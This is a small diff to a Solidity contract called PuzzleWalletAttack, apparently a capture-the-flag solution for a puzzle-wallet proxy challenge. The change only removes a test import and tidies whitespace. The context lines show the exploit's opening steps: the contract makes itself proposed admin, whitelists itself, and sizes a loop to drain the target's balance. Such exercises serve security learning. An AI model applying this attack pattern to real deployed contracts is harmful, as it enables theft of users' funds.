@@ -2,7 +2,6 @@
 pragma solidity ^0.8.0;
 
 import "./IPuzzleProxy.sol";
-import {Test, console} from "forge-std/Test.sol";
 
 contract PuzzleWalletAttack {
     IPuzzleProxy target;
@@ -14,7 +13,7 @@ contract PuzzleWalletAttack {
     function run() public payable {
         target.proposeNewAdmin(address(this));
         target.addToWhitelist(address(this));
-    
+
         uint256 numberOfIterations = (address(target).balance / msg.value) + 1;
         bytes[] memory data = new bytes[](numberOfIterations);
 
